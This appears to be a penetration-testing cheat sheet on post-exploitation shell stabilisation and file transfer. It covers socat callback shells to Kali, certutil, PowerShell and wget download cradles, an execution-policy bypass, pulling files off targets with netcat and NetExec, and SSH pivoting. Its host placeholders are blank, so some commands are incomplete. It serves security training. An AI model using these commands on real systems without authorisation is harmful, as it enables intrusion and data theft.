> Purpose: get a usable interactive shell, then move files in both directions without guessing which cradle the target supports. One page: serve → download → upload → verify. ## Pick the channel first | Need | Tool | Runs on | | --- | --- | --- | | Stable TTY from a dumb shell | python3 pty.spawn, socat | target | | Serve a file over HTTP | python3 -m http.server | Kali | | Serve a file over SMB | impacket-smbserver | Kali | | Download on Linux | wget, curl | target | | Download on Windows | certutil, IWR, copy | target | | Upload to Linux | scp | target | | Upload to Windows | nxc --put-file, SMB share write | Kali / target | | Pull a file back | nxc --get-file, SMB share, base64 | Kali | Rule: prefer HTTP for downloads, SMB for bulk or when HTTP is filtered, and base64 only for small text (keys, scripts). Never assume certutil exists just because the host is Windows. ## A. Stabilise the shell ### Step 01 — Get a real TTY Priority: Core · Run on: target · Status: Syntax Checked ```bash python3 -c 'import pty;pty.spawn("/bin/bash")' # or, if python is absent script -qc /bin/bash /dev/null ``` Look for: a prompt where arrow keys and Ctrl-C behave normally.
Decision: python3 exists → this is the fastest route. No python → script, then socat (Step 03).
Next: Step 02.
Common mistake: stopping at pty.spawn and not fixing the terminal — you get a TTY that still has no job control or echo.
Evidence: the command used and the resulting prompt. ### Step 02 — Fix terminal settings Priority: Core · Run on: Kali then target · Status: Syntax Checked ```bash # in the target shell export TERM=xterm stty rows 40 cols 160 # in Kali: background the shell, then stty raw -echo; fg ``` Look for: sudo, vim, nano and su accepting input correctly; Ctrl-C not killing the shell.
Decision: still broken → Step 03 (socat gives a fully functional PTY).
Next: proceed with enumeration, or Step 03 if tools need a TTY.
Common mistake: running stty raw -echo on the target. It belongs on Kali after you background the shell, then fg.
Evidence: the stty -a output on the target. ### Step 03 — socat full TTY (when python is missing) Priority: Conditional · Run on: Kali + target · Status: Documented ```bash # Kali listener socat file:`tty`,raw,echo=0 tcp-listen:,reuseaddr # target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:: ``` Look for: a prompt with working job control and history.
Decision: socat is not on the target → upload a static binary (Step 04/05) or stay with script.
Next: enumerate.
Common mistake: forgetting sane on the target side — the terminal stays in raw mode after exit.
Evidence: the working prompt. ## B. Serve files from Kali ### Step 04 — HTTP server Priority: Core · Run on: Kali · Status: Syntax Checked ```bash python3 -m http.server python3 -m http.server --directory ``` Look for: Serving HTTP on 0.0.0.0 port … and a GET line per download.
Decision: the target can reach you → this is the default channel. Target cannot reach Kali → see the pivoting note.
Next: Step 07 (Linux) or Step 10/11 (Windows).
Common mistake: starting the server in the wrong directory. Use --directory or cd first — the target sees only the current folder.
Evidence: the access log line for the transferred file. ### Step 05 — SMB server Priority: Core · Run on: Kali · Status: Syntax Checked ```bash impacket-smbserver share $(pwd) -smb2support -username -password # Windows target copy \\\share\ C:\Windows\Temp\ ``` Look for: Config file / Serving lines and the file appearing on the target.
Decision: HTTP is blocked but 445 outbound works → SMB. Modern Windows refuses guest SMB → always set -username/-password.
Next: execute or verify (Step 15).
Common mistake: running smbserver without credentials on a hardened host — Windows blocks insecure guest auth by default.
Evidence: the SMB log and the transferred file. ### Step 06 — Netcat: banner grab and ad-hoc transfer Priority: Conditional · Run on: Kali · Status: Syntax Checked ```bash # banner grab nc -nv # receive a file (Kali) nc -lvnp > # send a file (target) nc < ``` Look for: the service banner, or a completed file with matching size.
Decision: no banner → the port may be filtered or TLS-wrapped; use openssl s_client.
Next: verify integrity (Step 15).
Common mistake: omitting -l and accidentally connecting out instead of listening, or omitting -n so netcat stalls on DNS. nc -lvnp works on this build (verified); nc -l -p is the equivalent long form.
Evidence: the banner text or the received file hash. ## C. Linux target ### Step 07 — wget Priority: Core · Run on: Linux target · Status: Syntax Checked ```bash wget http://:/ -O /tmp/ # optional: headers only, or mirror a site wget --server-response http://:/ wget --mirror http:/// ``` Look for: '' saved and the expected byte count.
Decision: wget missing → Step 08 (curl) or python3 -c with urllib.
Next: chmod +x and run, or Step 15.
Common mistake: forgetting -O /tmp/ — the file lands in the current directory with a name derived from the URL.
Evidence: the saved path and ls -l. ### Step 08 — curl Priority: Core · Run on: Linux target · Status: Syntax Checked ```bash curl -o /tmp/ http://:/ curl -s -O http://:/ ``` Look for: the file on disk, no HTML error page.
Decision: curl missing → wget, or busybox wget on embedded systems.
Next: execute or verify.
Common mistake: downloading an error page because the URL is wrong — always check the size and file type before running it.
Evidence: ls -l and file /tmp/. ### Step 09 — scp (both directions) Priority: Core · Run on: Kali or target · Status: Syntax Checked ```bash # upload from Kali scp @:/tmp/ # download to Kali scp @:/tmp/ / # non-standard port scp -P @:/tmp/ ``` Look for: a progress bar and the file at the destination.
Decision: SSH is open and you have a password or key → fastest bidirectional channel.
Next: verify (Step 15).
Common mistake: using -p for the port. In scp the port flag is capital -P; lowercase preserves timestamps.
Evidence: the scp output and destination listing. ## D. Windows target ### Step 10 — certutil Priority: Core · Run on: Windows target · Status: Syntax Checked ```shen certutil -urlcache -split -f http://:/ C:\Windows\Temp\ ``` Look for: CertUtil: -URLCache command completed successfully and the file in Temp.
Decision: certutil is blocked by AV/AppLocker → Step 11 or Step 12.
Next: run it, or Step 15.
Common mistake: omitting -split -f — without them certutil may cache instead of writing the file where you expect.
Evidence: the certutil output and dir C:\Windows\Temp. ### Step 11 — PowerShell download Priority: Core · Run on: Windows target · Status: Syntax Checked ```powershell IWR -Uri http://:/ -OutFile C:\Windows\Temp\ Invoke-WebRequest -Uri http://:/ -OutFile C:\Windows\Temp\ ``` Look for: no error and the file present.
Decision: IWR blocked by script policy → powershell -ep bypass -c "IWR …" or Step 12.
Next: execute, or Step 15.
Common mistake: using -OutFile with a relative path from a shell whose working directory you do not control. Always use the full C:\… path.
Evidence: Get-Item on the downloaded file. ### Step 12 — Copy from an SMB share Priority: Conditional · Run on: Windows target · Status: Syntax Checked ```shen copy \\\share\ C:\Windows\Temp\ ``` ```bash # or pull a specific file back to Kali nxc smb -u -p --get-file \Windows\Temp\ ./ ``` Look for: 1 file(s) copied / the file appearing locally.
Decision: outbound 445 works → this is the most reliable Windows channel. No SMB → HTTP cradles.
Next: verify (Step 15).
Common mistake: forgetting the double backslash prefix for a UNC path (\\\share), which turns it into a local path.
Evidence: the copy output and the file hash. ### Step 13 — Push with NetExec Priority: Core · Run on: Kali · Status: Syntax Checked ```bash nxc smb -u -p --put-file \Windows\Temp\ ``` Look for: File was uploaded or no error, and the file on the target.
Decision: you have SMB admin → push without touching the target's download tools. No admin → use an HTTP/WMI method.
Next: execute via -x, or verify.
Common mistake: passing a full C:\… path where nxc expects a share-relative path (\Windows\Temp\). Check the version's help.
Evidence: the nxc output and dir on the target. ### Step 14 — Base64 (text and small binaries) Priority: Conditional · Run on: either side · Status: Syntax Checked ```bash # encode (Linux) base64 -w0 > # decode (Linux target) base64 -d > ``` ```powershell # decode (Windows PowerShell) [IO.File]::WriteAllBytes("C:\Windows\Temp\",[Convert]::FromBase64String("")) ``` Look for: the decoded file's hash matching the source.
Decision: no network egress and only a text channel (RDP clipboard, web shell) → base64. Large binaries → split into chunks and reassemble.
Next: verify (Step 15).
Common mistake: pasting a wrapped base64 blob. Use -w0 to disable line wrapping, or the Windows decode fails silently.
Evidence: matching hashes on both ends. ## E. Verify integrity ### Step 15 — Confirm the transfer Priority: Core · Run on: both · Status: Syntax Checked ```bash md5sum sha256sum ``` ```cmd # Windows cmd certutil -hashfile C:\Windows\Temp\ SHA256 ``` ```powershell # Windows PowerShell — Get-FileHash is a cmdlet, not a cmd.exe built-in Get-FileHash C:\Windows\Temp\ -Algorithm SHA256 ``` Look for: identical hashes on Kali and the target.
Decision: mismatch → the transfer truncated (text mode, base64 wrapping, or an error page). Re-send with a binary-safe method.
Next: execute the file, or attach the hash to your notes.
Common mistake: comparing hashes of a file that was modified by the target (line-ending conversion). Hash the exact artifact you will use.
Evidence: both hash outputs side by side. ## F. Decision tree | Situation | Do this | Do not | | --- | --- | --- | | Dumb shell, python present | pty.spawn • stty (Steps 01-02) | Work in a shell without job control | | Linux target, HTTP outbound | wget/curl (Steps 07-08) | Try certutil on Linux | | Windows target, HTTP outbound | certutil or IWR (Steps 10-11) | Assume PowerShell is unrestricted | | HTTP filtered, SMB open | smbserver + copy (Steps 05/12) | Use guest SMB on modern Windows | | Have SMB admin | nxc --put-file (Step 13) | Upload by hand | | Only a text channel | base64 (Step 14) | Paste a wrapped blob | | Need a file back | nxc --get-file, SMB, or base64 | Screenshot the content | | Transfer "worked" but file won't run | Wrong architecture / truncation | Re-run it blindly | ## G. Troubleshooting | Symptom | Cause | Fix | | --- | --- | --- | | Downloaded file is HTML | Wrong URL / 404 page | Check the server log and file output | | Permission denied executing | No +x bit | chmod +x | | Text file busy | File running or mounted noexec | Copy to /tmp and chmod | | certutil writes nothing | Cached / wrong flags | -urlcache -split -f | | SMB access denied | Guest blocked | Add -username/-password | | scp connection refused | SSH not open | Use HTTP/SMB, or another port | | base64 decode fails | Line wrapping / bad padding | -w0, verify length multiple of 4 | | Transfer stalls on large file | Timeout / MTU | Split with split, or use SMB | Pivoting variant. If the target can only reach the pivot, do not serve from Kali. Either upload the tool to the pivot and serve it there, or reverse-forward Kali's server onto the pivot: ```bash # on Kali — expose local 8000 on the pivot's 8000 ssh -R 8000:127.0.0.1:8000 @ # on the target — download through the pivot wget http://:8000/ -O /tmp/ ``` scp through a proxy needs a ProxyCommand; simpler to use nxc --put-file/--get-file or SMB, which ride the existing tunnel without extra configuration. ## H.
